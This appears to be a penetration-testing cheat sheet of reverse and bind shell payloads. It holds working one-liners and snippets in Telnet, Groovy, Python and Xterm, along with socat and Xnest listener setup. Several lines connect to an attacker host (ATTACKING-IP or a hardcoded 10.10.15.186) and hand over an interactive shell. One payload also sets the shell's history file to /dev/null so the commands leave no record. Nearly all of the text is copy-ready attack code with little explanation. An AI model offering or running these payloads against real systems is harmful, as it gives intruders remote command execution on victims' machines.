# Reverse/Bind Shells

### Telnet

```
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
```

```
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

### Groovy

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

This was sourced from a gist user [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).

### Python

```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Sometimes however, you may need to use an alternate protocol with python, and while the above is a good one-liner it's a bit difficult to work with.  I'd recommend using pty, and an excellent source for pty-webshells is [https://github.com/infodox/python-pty-shells](https://github.com/infodox/python-pty-shells).

```py
import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.15.186\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
```

These shells can't be captured with netcat however, you'll have to use socat

```bash
socat file:`tty`,echo=0,raw udp-listen:1234
```

### Xterm

For this you'll need xnest installed and a remote xterm client available.  You can set up the listener on your own listener server using one of the following two commands:

```
Xnest :3 -ac -once -query localhost
Xnest :3 -listen tcp
```

This opens a listener on port 6003, but you can choose any alternative to `:3`

The access control list on your server also needs to be amended to allow access from your machine.

```
xhost +<remote ip>
```

On the remote machine you can then run:

```
xterm -display <server ip>:3
```

From this you'll receive a reverse shell.

